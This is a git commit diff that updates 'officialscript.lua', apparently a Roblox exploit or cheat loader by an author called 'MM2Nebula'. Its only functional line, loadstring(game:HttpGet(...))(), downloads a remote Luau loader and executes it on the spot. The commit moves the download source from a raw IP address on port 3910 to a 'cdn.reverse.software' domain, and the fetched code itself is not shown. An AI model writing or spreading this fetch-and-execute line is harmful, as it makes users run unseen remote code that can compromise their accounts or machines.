388613e88cb3201927b4ce8ca4576c04bd70a38b
MM2Nebula <guilherme09goncalves@icloud.com>
2025-09-06 21:19:34 +0100

    Update officialscript.lua

--- officialscript.lua
+++ officialscript.lua
@@ -1,2 +1,2 @@
 ID="329a1299-aae1-43c0-8734-67b52add2230";
-loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
+loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
